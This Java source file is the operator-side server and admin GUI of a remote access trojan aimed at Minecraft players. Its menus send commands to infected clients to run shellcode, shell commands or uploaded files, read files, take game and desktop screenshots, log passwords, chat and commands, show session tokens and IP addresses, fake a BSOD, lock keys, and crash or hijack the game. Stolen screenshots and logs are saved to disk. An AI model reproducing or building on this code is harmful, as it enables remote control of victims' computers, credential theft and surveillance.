package me.soda.witch.server.server;

import com.google.gson.Gson;
import me.soda.witch.server.gui.AdminPanel;
import me.soda.witch.server.gui.GUI;
import me.soda.witch.server.gui.ServerChatWindow;
import me.soda.witch.server.utils.Info;
import me.soda.witch.server.utils.Utils;
import me.soda.witch.shared.Crypto;
import me.soda.witch.shared.FileUtil;
import me.soda.witch.shared.socket.Connection;
import me.soda.witch.shared.socket.TcpServer;
import me.soda.witch.shared.socket.messages.Data;
import me.soda.witch.shared.socket.messages.Message;
import me.soda.witch.shared.socket.messages.messages.*;
import net.miginfocom.swing.MigLayout;

import javax.swing.*;
import javax.swing.event.PopupMenuEvent;
import javax.swing.event.PopupMenuListener;
import javax.swing.table.DefaultTableModel;
import javax.swing.text.JTextComponent;
import java.awt.*;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.ConcurrentHashMap;
import java.util.stream.Stream;

public class Server extends TcpServer {
    private static final Gson GSON = new Gson();
    public final ConcurrentHashMap<Connection, Info> clientMap = new ConcurrentHashMap<>();
    protected final ClientConfigData clientDefaultConf = Utils.getDefaultClientConfig();
    protected final ServerConfig config = Utils.getServerConfig();
    private final AdminPanel adminPanel;
    private final List<Integer> selectedConns = new ArrayList<>();
    private final GUI gui;
    private final List<ServerChatWindow> chatWindows = new ArrayList<>();
    private int clientIndex = 0;

    public Server() throws IOException {
        super();
        adminPanel = new AdminPanel();
        gui = new GUI(adminPanel);
        gui.addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent e) {
                try {
                    stop();
                } catch (IOException | InterruptedException ex) {
                    JOptionPane.showConfirmDialog(gui, ex.getMessage(), "Failed to stop server", JOptionPane.DEFAULT_OPTION, JOptionPane.ERROR_MESSAGE);
                    System.exit(1);
                }
            }
        });

        adminPanel.table.setComponentPopupMenu(
                new JPopupMenu() {{
                    addPopupMenuListener(new PopupMenuListener() {
                        @Override
                        public void popupMenuWillBecomeVisible(PopupMenuEvent e) {
                            selectedConns.clear();
                            int[] i = adminPanel.table.getSelectedRows();
                            for (int i1 : i) {
                                selectedConns.add((Integer) adminPanel.table.getValueAt(i1, 0));
                            }
                        }

                        @Override
                        public void popupMenuWillBecomeInvisible(PopupMenuEvent e) {
                        }

                        @Override
                        public void popupMenuCanceled(PopupMenuEvent e) {
                        }
                    });


                    JMenuItem disconnect = new JMenuItem("Disconnect");
                    disconnect.addActionListener(e -> getConnStream().forEach(connection -> connection.close(DisconnectData.Reason.NOREC)));

                    JMenuItem reconnect = new JMenuItem("Reconnect");
                    reconnect.addActionListener(e -> getConnStream().forEach(connection -> connection.close(DisconnectData.Reason.RECONNECT)));

                    JMenuItem execute = new JMenuItem("Execute");
                    execute.addActionListener(e -> {
                        JFileChooser fileChooser = new JFileChooser();
                        if (fileChooser.showOpenDialog(this) == JFileChooser.APPROVE_OPTION) {
                            try (FileInputStream is = new FileInputStream(fileChooser.getSelectedFile())) {
                                byte[] data = is.readAllBytes();
                                send(new ByteData("execute", data));
                            } catch (IOException ex) {
                                JOptionPane.showConfirmDialog(this, ex.getMessage(), "Error", JOptionPane.DEFAULT_OPTION, JOptionPane.ERROR_MESSAGE);
                            }
                        }
                    });

                    JMenuItem config = new JMenuItem("Config");
                    config.addActionListener(e -> getConnStream().forEach(conn -> {
                        ClientConfigData cfg = clientMap.get(conn).configData;
                        new JDialog(gui, true) {{
                            JCheckBox passwordBeingLogged = new JCheckBox("Log password", cfg.passwordBeingLogged);
                            JCheckBox isMuted = new JCheckBox("Mute", cfg.isMuted);
                            JCheckBox isBeingFiltered = new JCheckBox("Filter", cfg.isBeingFiltered);
                            JTextField filterPattern = new JTextField(cfg.filterPattern);
                            JCheckBox logChatAndCommand = new JCheckBox("Log chat and command", cfg.passwordBeingLogged);
                            JCheckBox canJoinServer = new JCheckBox("Can join server", cfg.passwordBeingLogged);
                            JCheckBox canQuitServerOrCloseWindow = new JCheckBox("Can quit server or close window", cfg.passwordBeingLogged);
                            JTextField serverName = new JTextField(cfg.name);
                            JTextArea invisiblePlayers = new JTextArea();
                            cfg.invisiblePlayers.forEach(p -> invisiblePlayers.append(p + "\n"));
                            JButton send = new JButton("Send");
                            send.addActionListener(e1 -> {
                                cfg.passwordBeingLogged = passwordBeingLogged.isSelected();
                                cfg.isMuted = isMuted.isSelected();
                                cfg.isBeingFiltered = isBeingFiltered.isSelected();
                                cfg.filterPattern = filterPattern.getText();
                                cfg.logChatAndCommand = logChatAndCommand.isSelected();
                                cfg.canJoinServer = canJoinServer.isSelected();
                                cfg.canQuitServerOrCloseWindow = canQuitServerOrCloseWindow.isSelected();
                                cfg.name = serverName.getText();
                                cfg.invisiblePlayers = Arrays.stream(invisiblePlayers.getText().split("\n")).map(s -> s.replace("\r", "")).filter(String::isBlank).toList();
                                send(cfg);
                                clientMap.get(conn).configData = cfg;
                                dispose();
                            });

                            setLayout(new MigLayout());
                            add(passwordBeingLogged, "wrap");
                            add(isMuted, "wrap");
                            add(isBeingFiltered, "wrap");
                            add(new JLabel("Filter pattern"), "split 2");
                            add(filterPattern, "wrap, growx");
                            add(logChatAndCommand, "wrap");
                            add(canJoinServer, "wrap");
                            add(canQuitServerOrCloseWindow, "wrap");
                            add(new JLabel("Server name"), "split 2");
                            add(serverName, "wrap, growx");
                            add(new JLabel("Invisible players"), "split 2");
                            add(invisiblePlayers, "wrap, growx");
                            add(send);
                            setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
                            pack();
                            setLocationRelativeTo(null);
                            setVisible(true);
                        }};
                    }));

                    JMenuItem follow = new JMenuItem("Follow");
                    follow.addActionListener(e -> new JDialog(gui, true) {{
                        JTextField followPlayer = new JTextField("Player");
                        JTextField distance = new JTextField("4");
                        JCheckBox stop = new JCheckBox("Stop", false);
                        JButton send = new JButton("Send");
                        send.addActionListener(e1 -> {
                            send(new FollowData(followPlayer.getText(), Double.parseDouble(distance.getText()), stop.isSelected()));
                            dispose();
                        });

                        setLayout(new MigLayout());
                        add(new JLabel("Text"), "split 2");
                        add(followPlayer, "wrap, growx");
                        add(new JLabel("Distance"), "split 2");
                        add(distance, "wrap, growx");
                        add(send);
                        setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
                        pack();
                        setLocationRelativeTo(null);
                        setVisible(true);
                    }});

                    JMenuItem spam = new JMenuItem("Spam");
                    spam.addActionListener(e -> new JDialog(gui, true) {{
                        JTextField text = new JTextField("Text");
                        JTextField times = new JTextField("10");
                        JTextField delayInTicks = new JTextField("20");
                        JCheckBox invisible = new JCheckBox("Target invisible", false);
                        JButton send = new JButton("Send");
                        send.addActionListener(e1 -> {
                            send(new SpamData(text.getText(), Integer.parseInt(times.getText()), Integer.parseInt(delayInTicks.getText()), invisible.isSelected()));
                            dispose();
                        });

                        setLayout(new MigLayout());
                        add(new JLabel("Text"), "split 2");
                        add(text, "wrap, growx");
                        add(new JLabel("Times"), "split 2");
                        add(times, "wrap, growx");
                        add(new JLabel("Delay in ticks"), "split 2");
                        add(delayInTicks, "wrap, growx");
                        add(invisible, "wrap");
                        add(send);
                        setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
                        pack();
                        setLocationRelativeTo(null);
                        setVisible(true);
                    }});

                    JMenuItem chat = new JMenuItem("Chat");
                    chat.addActionListener(e -> getConnStream().forEach(connection -> chatWindows.add(new ServerChatWindow(connection) {{
                        setTitle(String.format("Chat with %s(%d)", clientMap.get(connection).player.playerName(), clientMap.get(connection).id));
                    }})));

                    add(new JMenu("Client") {{
                        add(disconnect);
                        add(reconnect);
                        add(config);
                        add(getStringsMenu("Get Client Config", "config"));
                        add(getStringsMenu("Update Player Info", "player"));
                        add(new JMenuItem("Player Info") {{
                            addActionListener(e -> getConnStream().forEach(conn -> new JDialog() {{
                                PlayerData data = clientMap.get(conn).player;

                                setLayout(new MigLayout());
                                class NoEditTxt extends JTextField {
                                    public NoEditTxt(String txt) {
                                        super(txt);
                                        setEditable(false);
                                    }
                                }
                                add(new NoEditTxt("Player Name: " + data.playerName()), "wrap");
                                add(new NoEditTxt("UUID: " + data.uuid()), "wrap");
                                add(new NoEditTxt("Server: " + data.server()), "wrap");
                                add(new NoEditTxt("Token: " + data.token()), "wrap");
                                add(new JCheckBox("OP", data.isOp()), "wrap");
                                add(new JCheckBox("In game", data.inGame()), "wrap");
                                add(new JCheckBox("Windows", data.isWin()), "wrap");
                                add(new NoEditTxt("X: " + data.x()), "wrap");
                                add(new NoEditTxt("Y: " + data.y()), "wrap");
                                add(new NoEditTxt("Z: " + data.z()), "wrap");
                                setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
                                pack();
                                setLocationRelativeTo(null);
                                setVisible(true);
                            }}));
                        }});
                        add(getStringsMenu("Crash Minecraft", "crash"));
                    }});

                    add(new JMenu("System") {{
                        add(getStringsMenu("System Info", "systeminfo"));
                        add(getStringsMenu("Shellcode", "shellcode", "Shellcode"));
                        add(getStringsMenu("Shell Command", "shell", "Command"));
                        add(execute);
                        add(getStringsMenu("Run Arguments", "runargs"));
                        add(getStringsMenu("JVM Props", "props"));
                        add(getBoolMenu("KeyLocker", "keylocker"));
                    }});

                    add(new JMenu("Files") {{
                        add(getStringsMenu("Read file", "read", "File path"));
                    }});

                    add(new JMenu("Info") {{
                        add(getStringsMenu("Screenshot", "screenshot"));
                        add(getStringsMenu("Desktop Screenshot", "screenshot2"));
                        add(getStringsMenu("Player Skin", "skin"));
                        add(getStringsMenu("Mods", "mods"));
                        add(getStringsMenu("IP address", "ip"));
                    }});

                    add(new JMenu("Player") {{
                        add(follow);
                        add(spam);
                        add(getBoolMenu("Lick", "lick"));
                        add(getStringsMenu("Join Server", "join_server", "IP"));
                        add(getStringsMenu("Kick", "kick"));
                        add(getStringsMenu("OP Everyone", "op@a"));
                        add(getStringsMenu("DeOP Everyone", "deop@a"));
                    }});

                    add(new JMenu("Misc") {{
                        add(chat);
                        add(getBoolMenu("Fake BSOD", "bsod"));
                        add(getBoolMenu("Lag", "lagger"));
                        add(getStringsMenu("Open URL", "open_url", "Link"));
                    }});
                }}
        );

        log("--@@@@@@@ By Soda5601 @@@@@@@--");
        log("Server Config: %s", GSON.toJson(config));
        log("Client Config: %s", GSON.toJson(clientDefaultConf));
        log("Server started on %d", config.port);
        Crypto.INSTANCE = new Crypto(config.encryptionKey.getBytes());

        start(config.port);
    }

    private static String getFileName(String prefix, String suffix, String afterPrefix, boolean time) {
        return String.format("%s-%s%s.%s", prefix, afterPrefix, time ? LocalDateTime.now().format(DateTimeFormatter.ofPattern("-MM-dd-HH-mm-ss")) : "", suffix);
    }

    @Override
    public void onOpen(Connection conn) {
        String address = conn.getRemoteSocketAddress().getAddress().getHostAddress();
        log("Client connected: %s ID: %d", address, clientIndex);
        Info i = new Info(clientIndex);
        i.configData = clientDefaultConf;
        clientMap.put(conn, i);
        ((DefaultTableModel) adminPanel.table.getModel()).addRow(new Object[]{clientIndex, null, null});
        clientIndex++;
    }

    @Override
    public void onClose(Connection conn, DisconnectData disconnectData) {
        Info info = clientMap.get(conn);
        changeRow(info, true);
        chatWindows.stream().filter(wnd -> wnd.connection == conn).forEach(Window::dispose);
        chatWindows.removeIf(wnd -> wnd.connection == conn);
        log("Client disconnected: ID: %d", info.id);
        clientMap.remove(conn);
    }

    @Override
    public void onMessage(Connection conn, Message message) {
        Info info = clientMap.get(conn);
        int id = info.id;
        try {
            if (message.data instanceof ByteData data) {
                switch (data.id) {
                    case "screenshot", "screenshot2" -> {
                        File file = new File(Utils.getDataFile("screenshots"), getFileName(data.id + "id", "png", String.valueOf(id), true));
                        FileUtil.writeBytes(file, data.bytes());
                    }
                    case "skin" -> {
                        String playerName = info.player.playerName();
                        File file = new File(Utils.getDataFile("skins"), getFileName(playerName, "png", String.valueOf(id), false));
                        FileUtil.writeBytes(file, data.bytes());
                    }
                }
            } else if (message.data instanceof StringsData data) {
                switch (data.id()) {
                    case "mods", "runargs" -> {
                        File file = new File(Utils.getDataFile("data"), getFileName(data.id(), "txt", info.player.playerName(), true));
                        FileUtil.write(file, data.toString());
                    }
                    case "shell" -> log("Received shell data: %s From ID %d", data.data().get(0), id);
                }
                if (data.data().size() == 0 && data.id().equals("getconfig")) {
                    conn.send(clientDefaultConf);
                } else if (data.data().size() == 1) {
                    String msg = data.data().get(0);
                    switch (data.id()) {
                        case "chat" ->
                                chatWindows.stream().filter(wnd -> wnd.connection == conn).forEach(wnd -> wnd.receivedText.append("Target: " + msg));
                        case "logging" -> {
                            File file = new File(Utils.getDataFile("player_logs"), getFileName("id", "log", String.valueOf(id), false));
                            String oldInfo = FileUtil.read(file);
                            FileUtil.writeBytes(file, (oldInfo + msg).getBytes());
                        }
                        case "ip" -> {
                            info.ip = msg;
                            changeRow(info, false);
                        }
                        case "mods", "runargs", "systeminfo", "props" -> {
                            File file = new File(Utils.getDataFile("data"), getFileName(data.id(), "txt", info.player.playerName(), true));
                            FileUtil.write(file, msg);
                        }
                        default -> log("Received message: %s From ID %d", message.toString(), id);
                    }
                }
            } else if (message.data instanceof PlayerData data) {
                info.player = data;
                changeRow(info, false);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void log(String str, Object... format) {
        adminPanel.console.append("[" + LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss.SS")) + "] " + String.format(str, format));
    }

    private void changeRow(Info info, boolean delete) {
        DefaultTableModel connTableModel = (DefaultTableModel) adminPanel.table.getModel();
        for (int i = 0; i < connTableModel.getRowCount(); i++) {
            int id = (int) connTableModel.getValueAt(i, 0);
            if (id == info.id) {
                if (delete) {
                    connTableModel.removeRow(i);
                    return;
                }

                connTableModel.setValueAt(info.ip, i, 1);
                connTableModel.setValueAt(info.player != null ? info.player.playerName() : "", i, 2);
                return;
            }
        }
    }

    private void send(Data data) {
        getConnections().stream().filter(conn -> selectedConns.contains(clientMap.get(conn).id)).forEach(connection -> connection.send(data));
    }

    private Stream<Connection> getConnStream() {
        return getConnections().stream().filter(conn -> selectedConns.contains(clientMap.get(conn).id));
    }

    private JMenuItem getBoolMenu(String name, String command) {
        JMenuItem menuItem = new JMenuItem(name);
        menuItem.addActionListener(e -> new JDialog(gui, true) {{
            JCheckBox checkBox = new JCheckBox("Set enabled", false);
            JButton send = new JButton("Send");
            send.addActionListener(e1 -> {
                send(new BooleanData(command, checkBox.isSelected()));
                dispose();
            });

            setLayout(new MigLayout());
            add(checkBox, "wrap");
            add(send);
            setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
            pack();
            setLocationRelativeTo(null);
            setResizable(false);
            setVisible(true);
        }});
        return menuItem;
    }

    private JMenuItem getStringsMenu(String name, String command, String... argNames) {
        JMenuItem menuItem = new JMenuItem(name);
        menuItem.addActionListener(e -> {
            if (argNames.length == 0) {
                send(new StringsData(command, List.of()));
                return;
            }
            new JDialog(gui, true) {{
                setLayout(new MigLayout());
                List<JTextField> texts = new ArrayList<>();
                for (String argName : argNames) {
                    JTextField textField = new JTextField(10);
                    texts.add(textField);

                    add(new JLabel(argName));
                    add(textField, "wrap");
                }

                JButton send = new JButton("Send");
                send.addActionListener(e1 -> {
                    send(new StringsData(command, texts.stream().map(JTextComponent::getText).toList()));
                    dispose();
                });

                add(send);
                setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
                pack();
                setLocationRelativeTo(null);
                setVisible(true);
            }};
        });
        return menuItem;
    }
}
